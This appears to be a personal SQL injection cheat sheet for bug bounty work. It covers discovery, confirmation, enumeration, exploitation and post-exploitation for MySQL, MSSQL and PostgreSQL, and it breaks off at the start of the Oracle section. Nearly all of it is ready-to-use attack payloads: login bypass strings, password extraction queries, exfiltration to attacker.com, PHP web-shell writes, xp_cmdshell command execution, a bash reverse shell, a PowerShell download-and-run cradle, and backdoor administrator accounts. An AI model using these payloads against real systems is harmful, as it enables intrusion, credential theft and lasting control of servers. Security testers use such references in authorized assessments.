

# 🟢 ULTIMATE SQL INJECTION CHEAT SHEET


---

## References:

-  file:///E:/Bug%20Bounty/4-Input%20Injection/SQL%20INJECTION/sqli_cheatsheet.html
-  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
## 📋 TABLE OF CONTENTS

```
🔹 PART 1: METHODOLOGY (Step-by-Step)
   ├── Phase 1: Discovery
   ├── Phase 2: Confirmation
   ├── Phase 3: Enumeration
   ├── Phase 4: Exploitation
   └── Phase 5: Post-Exploitation

🔹 PART 2: SQLi TYPES (With Payloads)
   ├── Union-Based
   ├── Error-Based
   ├── Boolean-Based Blind
   ├── Time-Based Blind
   ├── Out-of-Band (OOB)
   ├── Stacked Queries
   ├── Second-Order SQLi
   └── Authentication Bypass

🔹 PART 3: DATABASE-SPECIFIC GUIDE
   ├── MySQL / MariaDB
   ├── Microsoft SQL Server (MSSQL)
   ├── PostgreSQL
   ├── Oracle
   ├── SQLite
   └── MS Access

🔹 PART 4: WAF BYPASS MASTER LIST
   ├── No Space Allowed
   ├── No Comma Allowed
   ├── No Equal Allowed
   ├── Keyword Blacklist Bypass
   ├── Encoding Tricks
   └── Advanced Evasion

🔹 PART 5: TOOLS CHEAT SHEET
   ├── SQLMap Complete Guide
   ├── Ghauri Complete Guide
   ├── Manual Testing Checklist
   └── Burp Suite Integration

🔹 PART 6: QUICK REFERENCE TABLES
   ├── Comments by DBMS
   ├── String Functions by DBMS
   ├── Time Delay by DBMS
   ├── Error-Based by DBMS
   └── OOB Exfiltration by DBMS
```

---

# 🔹 PART 1: METHODOLOGY (Step-by-Step)

## 🎯 PHASE 1: DISCOVERY (Find Injection Points)

### ✅ Where to Test:
```
📍 GET Parameters:    /page.php?id=1
📍 POST Parameters:   username=admin&pass=123
📍 HTTP Headers:      X-Forwarded-For, User-Agent, Referer
📍 Cookies:           sessionid=abc123
📍 URL Paths:         /file/123/edit
📍 JSON Body:         {"id": "123"}
📍 XML/SOAP:          <id>123</id>
📍 File Upload Names: filename=' OR 1=1--
```

### ✅ Quick Discovery Payloads:
```sql
# Basic quote tests
'
"
`
')
")
`))

# Simple logic tests
' OR '1'='1
" OR "1"="1
') OR ('1'='1

# Comment tests
'--
' #
' /*

# Encoded versions (for WAF testing)
%27
%22
%60
%27%20OR%20%271%27%3D%271
```

### ✅ What to Look For:
```
✅ Database error messages (syntax error, conversion error)
✅ Page content changes (different length, missing elements)
✅ HTTP status code changes (200 → 500, 200 → 302)
✅ Response time changes (sudden delay = possible time-based)
✅ Application behavior changes (login success, data exposure)
```

---

## 🎯 PHASE 2: CONFIRMATION (Prove It's SQLi)

### ✅ Logic-Based Confirmation:
```http
# Test TRUE condition (should show normal page)
?id=1 OR 1=1--
?id=1' OR '1'='1
?id=1" OR "1"="1

# Test FALSE condition (should show different/empty page)
?id=1 AND 1=2--
?id=1' AND '1'='2
?id=1" AND "1"="2

# If TRUE = normal page AND FALSE = different page → SQLi confirmed ✅
```

### ✅ Math-Based Confirmation:
```http
# If these return same result → SQLi confirmed
?id=1
?id=2-1
?id=3-2
?id=1*1

# If these return different results → possible filtering
?id=1+1
?id=1-(-1)
```

### ✅ Time-Based Confirmation (Blind):
```sql
# MySQL
?id=1' AND SLEEP(5)--
?id=1' AND IF(1=1,SLEEP(5),0)--

# PostgreSQL
?id=1' AND pg_sleep(5)--

# MSSQL
?id=1'; WAITFOR DELAY '0:0:5'--

# Oracle
?id=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('X',5)--

# If response delays ~5 seconds → Blind SQLi confirmed ✅
```

### ✅ Error-Based Confirmation:
```sql
# Force error to leak DB info
?id=1' AND 1=CONVERT(int,@@version)--          # MSSQL
?id=1' AND EXTRACTVALUE(1,CONCAT(0x5c,database()))--  # MySQL
?id=1' AND 1=CAST((SELECT version()) AS int)--  # PostgreSQL

# If error message shows DB version/info → Error-based SQLi confirmed ✅
```

---

## 🎯 PHASE 3: ENUMERATION (Gather Info)

### ✅ Step 1: Identify DBMS Type
```sql
# Try these payloads, see which one works:

# MySQL
AND connection_id()=connection_id()
AND conv('a',16,2)=conv('a',16,2)

# MSSQL
AND @@CONNECTIONS>0
AND BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)

# PostgreSQL
AND 5::int=5
AND pg_client_encoding()=pg_client_encoding()

# Oracle
AND ROWNUM=ROWNUM
AND RAWTOHEX('AB')=RAWTOHEX('AB')

# SQLite
AND sqlite_version()=sqlite_version()
AND last_insert_rowid()>1
```

### ✅ Step 2: Get DB Version & User
```sql
# MySQL
SELECT @@version
SELECT USER()
SELECT @@hostname

# MSSQL
SELECT @@version
SELECT SYSTEM_USER
SELECT @@servername

# PostgreSQL
SELECT version()
SELECT current_user
SELECT inet_server_addr()

# Oracle
SELECT banner FROM v$version
SELECT user FROM dual
SELECT UTL_INADDR.get_host_name FROM dual

# SQLite
SELECT sqlite_version()
```

### ✅ Step 3: List Databases
```sql
# MySQL
SELECT schema_name FROM information_schema.schemata
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata

# MSSQL
SELECT name FROM master..sysdatabases
SELECT STRING_AGG(name, ', ') FROM master..sysdatabases

# PostgreSQL
SELECT datname FROM pg_database
SELECT STRING_AGG(datname, ', ') FROM pg_database

# Oracle
SELECT owner FROM all_users
SELECT LISTAGG(username, ', ') WITHIN GROUP (ORDER BY username) FROM all_users
```

### ✅ Step 4: List Tables (for specific DB)
```sql
# MySQL (for database 'target_db')
SELECT table_name FROM information_schema.tables 
WHERE table_schema='target_db'

SELECT GROUP_CONCAT(table_name) FROM information_schema.tables 
WHERE table_schema='target_db'

# MSSQL
SELECT table_name FROM target_db.information_schema.tables
SELECT STRING_AGG(table_name, ', ') FROM target_db.information_schema.tables

# PostgreSQL
SELECT table_name FROM information_schema.tables 
WHERE table_schema='public'

# Oracle
SELECT table_name FROM all_tables WHERE owner='TARGET_DB'
```

### ✅ Step 5: List Columns (for specific table)
```sql
# MySQL (for table 'users')
SELECT column_name FROM information_schema.columns 
WHERE table_name='users' AND table_schema='target_db'

SELECT GROUP_CONCAT(column_name) FROM information_schema.columns 
WHERE table_name='users' AND table_schema='target_db'

# MSSQL
SELECT column_name FROM target_db.information_schema.columns 
WHERE table_name='users'

# PostgreSQL
SELECT column_name FROM information_schema.columns 
WHERE table_name='users'

# Oracle
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
```

### ✅ Step 6: Extract Data
```sql
# MySQL - Get usernames and passwords
SELECT username, password FROM users
SELECT GROUP_CONCAT(username, ':', password) FROM users

# MSSQL
SELECT username + ':' + password FROM users
SELECT STRING_AGG(username + ':' + password, ', ') FROM users

# PostgreSQL
SELECT username || ':' || password FROM users
SELECT STRING_AGG(username || ':' || password, ', ') FROM users

# Oracle
SELECT username || ':' || password FROM users
SELECT LISTAGG(username || ':' || password, ', ') WITHIN GROUP (ORDER BY username) FROM users
```

---

## 🎯 PHASE 4: EXPLOITATION (Get the Data)

### ✅ Union-Based (When you see output):

```sql
# Step 1: Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  # Keep increasing until error → that's your column count

# Step 2: Find which columns are displayed
' UNION SELECT NULL,NULL,NULL--  # Replace NULL with 'x' one by one
' UNION SELECT 'x',NULL,NULL--   # See which position shows 'x' on page

# Step 3: Extract data in visible columns
' UNION SELECT 1,username,password FROM users--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--

# If only 1 column is visible, use CONCAT:
' UNION SELECT CONCAT(username,':',password) FROM users--
```

### ✅ Error-Based (When you see errors):

```sql
# MySQL
' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT database())))--
' AND UPDATEXML(1, CONCAT(0x5c, (SELECT password FROM users LIMIT 1)), 1)--

# MSSQL
' AND 1=CONVERT(int, (SELECT @@version))--
' AND 1=CAST((SELECT TOP 1 password FROM users) AS int)--

# PostgreSQL
' AND 1=CAST((SELECT version()) AS int)--
' AND (SELECT CAST(password AS int) FROM users LIMIT 1)--

# Oracle
' AND 1=(SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--
```

### ✅ Boolean-Based Blind (True/False via page behavior):

```sql
# Extract data character by character
# Get first char of database name:
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--  # If page normal → char > 64
' AND ASCII(SUBSTRING((SELECT database()),1,1))>96--   # Narrow down
' AND ASCII(SUBSTRING((SELECT database()),1,1))=100--  # Found: 'd'

# Extract password for user 'admin':
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>64--

# Use binary search to speed up:
# Test mid-point of ASCII range (32-126), narrow down each time
```

### ✅ Time-Based Blind (Delay = True):

```sql
# MySQL
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=100, SLEEP(3), 0)--

# PostgreSQL
' AND (SELECT CASE WHEN ASCII(SUBSTRING(version(),1,1))=50 
THEN pg_sleep(3) ELSE pg_sleep(0) END)--

# MSSQL
'; IF ASCII(SUBSTRING(@@version,1,1))=50 WAITFOR DELAY '0:0:3'--

# Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(
  (SELECT CASE WHEN ASCII(SUBSTR((SELECT banner FROM v$version),1,1))=79 
  THEN 'X' ELSE 'Y' END FROM dual), 3)--
```

### ✅ Out-of-Band (OOB) - DNS/HTTP Exfiltration:

```sql
# MySQL (Windows only)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))--

# MSSQL
'; EXEC master..xp_dirtree '//'+(SELECT @@version)+'.attacker.com/a'--

# PostgreSQL
COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT version())||'.attacker.com'

# Oracle (with XXE - older versions)
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users)||'.attacker.com/"> 
%remote;]>'),'/l') FROM dual

# Oracle (with privileges)
SELECT UTL_HTTP.REQUEST('http://attacker.com/?data='||(SELECT password FROM users)) FROM dual
```

---

## 🎯 PHASE 5: POST-EXPLOITATION

### ✅ Read Sensitive Files:

```sql
# MySQL
SELECT LOAD_FILE('/etc/passwd')
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts')

# MSSQL
SELECT * FROM OPENROWSET(BULK 'C:/Windows/win.ini', SINGLE_CLOB) AS x

# PostgreSQL
CREATE TABLE tmp(t text);
COPY tmp FROM '/etc/passwd';
SELECT * FROM tmp;

# Oracle (with Java)
-- See Oracle section below for Java-based file read
```

### ✅ Write Files / Web Shell:

```sql
# MySQL (if secure_file_priv allows)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/shell.php'

# MSSQL (with xp_cmdshell enabled)
EXEC xp_cmdshell 'echo <?php system($_GET["cmd"]); ?> > C:\inetpub\wwwroot\shell.php'

# PostgreSQL (with superuser)
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/shell.php'
```

### ✅ Execute System Commands:

```sql
# MySQL (with UDF)
CREATE FUNCTION sys_exec RETURNS STRING SONAME 'evil.so';
SELECT sys_exec('whoami');

# MSSQL (enable xp_cmdshell first)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# PostgreSQL (with superuser)
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'whoami';
SELECT * FROM cmd_exec;

# Oracle (with Java)
-- See Oracle section for Java-based command execution
```

### ✅ Create Backdoor User:

```sql
# MySQL
INSERT INTO mysql.user (User, Host, authentication_string, plugin) 
VALUES ('backdoor', '%', PASSWORD('P@ssw0rd123'), 'mysql_native_password');
FLUSH PRIVILEGES;

# MSSQL
EXEC sp_addlogin 'backdoor', 'P@ssw0rd123';
EXEC sp_addsrvrolemember 'backdoor', 'sysadmin';

# PostgreSQL
CREATE USER backdoor WITH PASSWORD 'P@ssw0rd123' SUPERUSER;

# Oracle
CREATE USER backdoor IDENTIFIED BY "P@ssw0rd123";
GRANT DBA TO backdoor;
```

---

# 🔹 PART 2: SQLi TYPES (With Payloads)

## 🔗 1. UNION-BASED SQLi

```
📌 When: You can see query output on page
📌 Goal: Combine your query with original to extract data

🔢 Find column count:
' ORDER BY 1--
' ORDER BY 2-- ... until error

📦 Extract with UNION:
' UNION SELECT NULL,NULL,NULL--  # Match column count
' UNION SELECT 'x',NULL,NULL--   # Find visible columns
' UNION SELECT 1,version(),3--   # Extract data

📋 Common extractions (MySQL):
# DB names
-1' UNION SELECT 1,2,GROUP_CONCAT(schema_name) FROM information_schema.schemata--

# Tables
-1' UNION SELECT 1,2,GROUP_CONCAT(table_name) 
FROM information_schema.tables WHERE table_schema='target_db'--

# Columns
-1' UNION SELECT 1,2,GROUP_CONCAT(column_name) 
FROM information_schema.columns WHERE table_name='users'--

# Data
-1' UNION SELECT 1,username,password FROM users--
-1' UNION SELECT 1,CONCAT(username,':',password) FROM users--  # If 1 column visible
```

## ⚠️ 2. ERROR-BASED SQLi

```
📌 When: Application shows database errors
📌 Goal: Force errors that leak data in error message

🐬 MySQL:
' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT database())))--
' AND UPDATEXML(1, CONCAT(0x5c, (SELECT password FROM users LIMIT 1)), 1)--

🪟 MSSQL:
' AND 1=CONVERT(int, (SELECT @@version))--
' AND 1=CAST((SELECT TOP 1 password FROM users) AS int)--

🐘 PostgreSQL:
' AND 1=CAST((SELECT version()) AS int)--
' AND (SELECT CAST(password AS int) FROM users LIMIT 1)--

☀️ Oracle:
' AND 1=(SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--
```

## 🙈 3. BOOLEAN-BASED BLIND SQLi

```
📌 When: No output, but page changes on TRUE/FALSE
📌 Goal: Extract data by asking yes/no questions

🔍 Basic pattern:
# TRUE condition (page looks normal)
?id=1' AND 1=1--

# FALSE condition (page looks different)
?id=1' AND 1=2--

🔤 Extract character by character:
# Is first char of DB name > 64 (ASCII for '@')?
?id=1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--

# Is it > 96 ('`')?
?id=1' AND ASCII(SUBSTRING((SELECT database()),1,1))>96--

# Is it = 100 ('d')?
?id=1' AND ASCII(SUBSTRING((SELECT database()),1,1))=100--

🎯 Extract password for 'admin':
?id=1' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>64--

⚡ Speed tip: Use binary search (test mid-point, narrow range)
```

## ⏱️ 4. TIME-BASED BLIND SQLi

```
📌 When: No output, no visible TRUE/FALSE difference
📌 Goal: Extract data by measuring response time

🐬 MySQL:
?id=1' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=100, SLEEP(3), 0)--
?id=1' AND (SELECT CASE WHEN ASCII(SUBSTRING(version(),1,1))=50 THEN SLEEP(3) ELSE 0 END)--

🪟 MSSQL:
?id=1'; IF ASCII(SUBSTRING(@@version,1,1))=50 WAITFOR DELAY '0:0:3'--

🐘 PostgreSQL:
?id=1' AND (SELECT CASE WHEN ASCII(SUBSTRING(version(),1,1))=50 THEN pg_sleep(3) ELSE pg_sleep(0) END)--

☀️ Oracle:
?id=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(
  (SELECT CASE WHEN ASCII(SUBSTR((SELECT banner FROM v$version),1,1))=79 
  THEN 'X' ELSE 'Y' END FROM dual), 3)--

🔍 How to use:
1. Send payload with SLEEP(3) for char = 'd' (ASCII 100)
2. If response takes ~3+ seconds → char is 'd' ✅
3. If response is fast → try next character
```

## 🌐 5. OUT-OF-BAND (OOB) SQLi

```
📌 When: No output, no time difference, no error messages
📌 Goal: Make DB send data to your server via DNS/HTTP

🛠️ Setup: Use Burp Collaborator or interactsh.com to get unique subdomain

🐬 MySQL (Windows only):
' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))--
# Result: DNS query to: <version>.attacker.com

🪟 MSSQL:
'; EXEC master..xp_dirtree '//'+(SELECT @@version)+'.attacker.com/a'--
# Result: SMB request to: <version>.attacker.com

🐘 PostgreSQL:
COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT version())||'.attacker.com'
# Result: DNS query to: <version>.attacker.com

☀️ Oracle (with privileges):
SELECT UTL_HTTP.REQUEST('http://attacker.com/?data='||(SELECT password FROM users)) FROM dual
# Result: HTTP request to: attacker.com/?data=<password>

☀️ Oracle (older, with XXE):
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users)||'.attacker.com/"> 
%remote;]>'),'/l') FROM dual
```

## 📦 6. STACKED QUERIES SQLi

```
📌 When: DB allows multiple queries separated by ;
📌 Goal: Run additional malicious queries after original

🪟 MSSQL (most reliable for stacked):
'; EXEC xp_cmdshell 'whoami'--
'; DROP TABLE users--
'; EXEC sp_addlogin 'backdoor', 'password'--

🐘 PostgreSQL:
'; COPY (SELECT '') TO PROGRAM 'whoami'--
'; CREATE TABLE backdoor(cmd text); COPY backdoor FROM PROGRAM 'id'--

🐬 MySQL (rare, depends on PHP/Python API):
'; SELECT 'test' INTO OUTFILE '/tmp/test.txt'--

☀️ Oracle: ❌ Does NOT support stacked queries

⚠️ Note: Results of second query usually NOT returned to app
→ Use for: Time delays, DNS exfil, command execution (blind scenarios)
```

## 🔁 7. SECOND-ORDER SQLi

```
📌 When: Input is stored first, used in query later
📌 Goal: Inject payload that executes when retrieved

🔄 Flow:
1. Attacker submits: username = attacker'--
2. App stores it safely (no injection yet)
3. Later, app uses stored value in query:
   query = "SELECT * FROM logs WHERE username = '" + stored_username + "'"
4. Injection triggers: SELECT * FROM logs WHERE username = 'attacker'--'

🎯 Example payload for storage:
username: admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin')--

🔍 How to find:
- Look for features that store user input (profile, comments, logs)
- Then look for features that display/use that stored data
- Test if stored payload executes when data is retrieved
```

## 🔓 8. AUTHENTICATION BYPASS

```
📌 When: Login form vulnerable to SQLi
📌 Goal: Log in without valid credentials

🎯 Basic bypass payloads:
Username: ' OR '1'='1'--
Password: (anything)

Username: admin'--
Password: (anything)

Username: ' OR 1=1 LIMIT 1--
Password: (anything)  # LIMIT prevents multiple results error

Username: " OR ""="
Password: (anything)

🎯 Target specific user:
Username: ' OR username='admin'--
Password: (anything)

🎯 Raw hash bypass (PHP MD5/SHA1 with binary output):
# If app uses: md5($pass, true) in query
# Payload password: ffifdyop  → md5 = 'or'6]!r,b
# Query becomes: WHERE pass = ''or'6...' → Always true!

🎯 Hashed password bypass (when UNION works):
# If app checks: hash(input) == stored_hash
# Inject: admin' AND 1=0 UNION SELECT 'admin', 'md5_of_known_password'--
# Then login with known password → hash matches → authenticated
```

---

# 🔹 PART 3: DATABASE-SPECIFIC GUIDE

## 🐬 MYSQL / MARIADB

### 🔑 Key Info Queries:
```sql
SELECT @@version;                    # DB version
SELECT USER();                       # Current DB user
SELECT @@hostname;                   # Server hostname
SELECT @@datadir;                    # Data directory
SELECT @@plugin_dir;                 # Plugin directory
SELECT @@secure_file_priv;           # File read/write restrictions
SELECT DATABASE();                   # Current database name
SELECT SCHEMA_NAME FROM information_schema.schemata;  # All DBs
```

### 📋 List Tables/Columns:

```sql
# Tables in current DB
SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE();

# Tables in specific DB
SELECT table_name FROM information_schema.tables WHERE table_schema='target_db';

# Columns in specific table
SELECT column_name FROM information_schema.columns 
WHERE table_name='users' AND table_schema='target_db';

# Concatenate for easier extraction
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='target_db';
SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users';
```

### 📤 Extract Data:

```sql
# Simple select
SELECT username, password FROM users;

# Concatenate rows
SELECT GROUP_CONCAT(username, ':', password) FROM users;

# Concatenate with separator
SELECT GROUP_CONCAT(username SEPARATOR ' | '), 
       GROUP_CONCAT(password SEPARATOR ' | ') FROM users;

# Limit results
SELECT username, password FROM users LIMIT 0,1;  # First row
SELECT username, password FROM users LIMIT 1,1;  # Second row
```

### 📁 File Operations:

```sql
# Read file (if permissions allow)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');

# Write file (if secure_file_priv allows)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/shell.php';
SELECT 'backdoor' INTO DUMPFILE '/tmp/backdoor.so';  # For UDF

# Check file permissions first:
SELECT @@secure_file_priv;  # NULL = anywhere, empty = disabled, path = restricted
```

### ⚡ Command Execution (UDF):
```sql
# Step 1: Upload UDF library (evil.so)
SELECT 0x7f454c46... INTO DUMPFILE '/usr/lib/mysql/plugin/evil.so';  # Hex of .so file

# Step 2: Create function
CREATE FUNCTION sys_exec RETURNS STRING SONAME 'evil.so';

# Step 3: Execute commands
SELECT sys_exec('whoami');
SELECT sys_exec('bash -i >& /dev/tcp/10.10.10.10/4444 0>&1');

# Alternative UDF functions:
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'evil.so';  # Returns command output
CREATE FUNCTION sys_set RETURNS INT SONAME 'evil.so';      # Sets env vars
```

### 🔐 Privilege Escalation:

```sql
# List user privileges
SELECT grantee, privilege_type FROM information_schema.user_privileges;
SELECT * FROM mysql.user WHERE user='root';

# Check if can write to plugin dir (for UDF)
SELECT @@plugin_dir;

# Check if can create files
SELECT @@secure_file_priv;

# Check if super privilege
SELECT IS_SUPER_PRIVILEGE('');  # MySQL 8.0+
```

### ⏱️ Time Functions:
```sql
SELECT SLEEP(5);                          # Unconditional delay
SELECT IF(1=1, SLEEP(3), 0);              # Conditional delay
SELECT BENCHMARK(1000000, MD5('test'));   # CPU-heavy delay (alternative)
```

### ⚠️ Error Functions:

```sql
# Extract data via error message
SELECT EXTRACTVALUE(1, CONCAT(0x5c, (SELECT database())));
SELECT UPDATEXML(1, CONCAT(0x5c, (SELECT password FROM users LIMIT 1)), 1);

# Force duplicate key error with data
SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2))x 
FROM information_schema.tables GROUP BY x;
```

---

## 🪟 MICROSOFT SQL SERVER (MSSQL)

### 🔑 Key Info Queries:

```sql
SELECT @@version;                    # DB version
SELECT SYSTEM_USER;                  # Current user
SELECT @@servername;                 # Server name
SELECT DB_NAME();                    # Current database
SELECT name FROM master..sysdatabases;  # All databases
```

### 📋 List Tables/Columns:

```sql
# Tables in current DB
SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE';

# Tables in specific DB
SELECT table_name FROM target_db.information_schema.tables;

# Columns in specific table
SELECT column_name FROM target_db.information_schema.columns WHERE table_name='users';

# Concatenate (MSSQL 2017+)
SELECT STRING_AGG(table_name, ', ') FROM target_db.information_schema.tables;
SELECT STRING_AGG(column_name, ', ') FROM target_db.information_schema.columns WHERE table_name='users';

# Older MSSQL (use FOR XML PATH)
SELECT STUFF((SELECT ',' + table_name FROM target_db.information_schema.tables 
FOR XML PATH('')), 1, 1, '');
```

### 📤 Extract Data:

```sql
# Simple select
SELECT username, password FROM users;

# Concatenate rows
SELECT username + ':' + password FROM users;

# Concatenate all rows (MSSQL 2017+)
SELECT STRING_AGG(username + ':' + password, ', ') FROM users;

# Older MSSQL
SELECT STUFF((SELECT ',' + username + ':' + password FROM users FOR XML PATH('')), 1, 1, '');
```

### 📁 File Operations:

```sql
# Read file via OPENROWSET (requires ad hoc distributed queries enabled)
SELECT * FROM OPENROWSET(BULK 'C:/Windows/win.ini', SINGLE_CLOB) AS x;

# Write via backup (if permissions allow)
BACKUP LOG target_db TO DISK = 'C:\\inetpub\\wwwroot\\shell.asp' WITH INIT;

# Access SMB share
EXEC xp_dirtree '\\10.10.10.10\share';
```

### ⚡ Command Execution (xp_cmdshell):

```sql
# Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/rev.ps1")';

# Alternative: Use OLE automation (if xp_cmdshell disabled)
DECLARE @shell INT;
EXEC sp_oacreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_oamethod @shell, 'run', NULL, 'cmd.exe /c whoami';
```

### 🔗 Linked Servers Abuse:

```sql
# Query linked server
SELECT * FROM OPENQUERY(linked_server, 'SELECT @@version');

# Enable xp_cmdshell on linked server (if you have rights)
EXEC('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT linked_server;
EXEC('EXEC xp_cmdshell ''whoami''') AT linked_server;

# Exfiltrate data via linked server
SELECT * FROM OPENQUERY(linked_server, 
  'EXEC master..xp_dirtree ''//attacker.com/''+'''+(SELECT TOP 1 password FROM users)+'''''');
```

### 🔐 Privilege Escalation:

```sql
# List logins and roles
SELECT name, password_hash FROM sys.sql_logins;
SELECT * FROM sys.server_principals WHERE type = 'S';  # SQL logins
SELECT * FROM sys.server_role_members;

# Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');  # Returns 1 if yes

# Impersonate other users (if has IMPERSONATE privilege)
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;  # Now running as sa
REVERT;  # Go back to original user
```

### ⏱️ Time Functions:

```sql
WAITFOR DELAY '0:0:5';                          # Unconditional delay (5 seconds)
IF 1=1 WAITFOR DELAY '0:0:3';                   # Conditional delay
IF (SELECT COUNT(*) FROM users WHERE username='admin')>0 WAITFOR DELAY '0:0:3';
```

### ⚠️ Error Functions:
```sql
# Force conversion error to leak data
SELECT 'foo' WHERE 1 = (SELECT 'secret');  # Error: Conversion failed...

# Cast to int to trigger error with data
SELECT CAST((SELECT TOP 1 password FROM users) AS int);

# Use in conditional
SELECT CASE WHEN 1=1 THEN 1/0 ELSE 1 END;  # Division by zero error
```

---

## 🐘 POSTGRESQL

### 🔑 Key Info Queries:

```sql
SELECT version();                        # DB version
SELECT current_user;                     # Current user
SELECT inet_server_addr();               # Server IP
SELECT current_database();               # Current DB
SELECT datname FROM pg_database;         # All databases
```

### 📋 List Tables/Columns:

```sql
# Tables in current schema (usually 'public')
SELECT table_name FROM information_schema.tables WHERE table_schema='public';

# Tables in all schemas
SELECT table_schema, table_name FROM information_schema.tables WHERE table_type='BASE TABLE';

# Columns in specific table
SELECT column_name FROM information_schema.columns WHERE table_name='users';

# Concatenate (PostgreSQL 9.0+)
SELECT STRING_AGG(table_name, ', ') FROM information_schema.tables WHERE table_schema='public';
SELECT STRING_AGG(column_name, ', ') FROM information_schema.columns WHERE table_name='users';
```

### 📤 Extract Data:

```sql
# Simple select
SELECT username, password FROM users;

# Concatenate rows
SELECT username || ':' || password FROM users;

# Concatenate all rows
SELECT STRING_AGG(username || ':' || password, ', ') FROM users;

# Array aggregation (alternative)
SELECT ARRAY_TO_STRING(ARRAY(SELECT username || ':' || password FROM users), ', ');
```

### 📁 File Operations:

```sql
# Read file (requires superuser or pg_read_server_files)
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('C:/Windows/win.ini');

# Write file via COPY (requires superuser or pg_write_server_files)
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/shell.php';

# Read via large objects
SELECT lo_import('/etc/passwd', 12345);  # Import as large object
SELECT lo_get(12345);                     # Read it
SELECT lo_export(12345, '/tmp/passwd');  # Export to new location
```

### ⚡ Command Execution:

```sql
# Via COPY PROGRAM (PostgreSQL 9.3+, requires superuser)
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'whoami';
SELECT * FROM cmd_exec;

# Via CREATE FUNCTION (requires superuser, compile C function)
CREATE OR REPLACE FUNCTION system(cstring) RETURNS INT
AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE C STRICT;
SELECT system('whoami');

# Via dblink extension (if enabled)
CREATE EXTENSION IF NOT EXISTS dblink;
SELECT dblink_connect('host=attacker.com user=postgres password=pass');
SELECT dblink_exec('DROP TABLE IF EXISTS backdoor');
```

### 🔐 Privilege Escalation:

```sql
# List users and privileges
SELECT usename, usecreatedb, usesuper FROM pg_user;
SELECT grantee, privilege_type FROM information_schema.role_table_grants;

# Check if superuser
SELECT current_setting('is_superuser');  # Returns 'on' if yes

# Create superuser (if has CREATEROLE + can grant)
CREATE USER backdoor WITH PASSWORD 'P@ssw0rd123' SUPERUSER;

# Escalate via SECURITY DEFINER functions
# Find functions with SECURITY DEFINER that run as owner
SELECT proname, proowner FROM pg_proc WHERE prosecdef = true;
```

### ⏱️ Time Functions:

```sql
SELECT pg_sleep(5);                          # Unconditional delay
SELECT CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END;  # Conditional
SELECT (SELECT CASE WHEN ASCII(SUBSTRING(version(),1,1))=50 THEN pg_sleep(3) ELSE pg_sleep(0) END);
```

### ⚠️ Error Functions:

```sql
# Force type cast error to leak data
SELECT CAST((SELECT version()) AS int);
SELECT CAST((SELECT password FROM users LIMIT 1) AS int);

# Use in conditional
SELECT CASE WHEN 1=1 THEN 1/(SELECT 0) ELSE 1 END;  # Division by zero
```

### 🌐 Out-of-Band:

```sql
# Via COPY PROGRAM + nslookup
COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT version())||'.attacker.com';

# Via dblink + external connection
CREATE EXTENSION IF NOT EXISTS dblink;
SELECT dblink_connect('host=attacker.com port=80 dbname=postgres user=test');
```

---

## ☀️ ORACLE

### 🔑 Key Info Queries:

```sql
SELECT banner FROM v$version;              # DB version
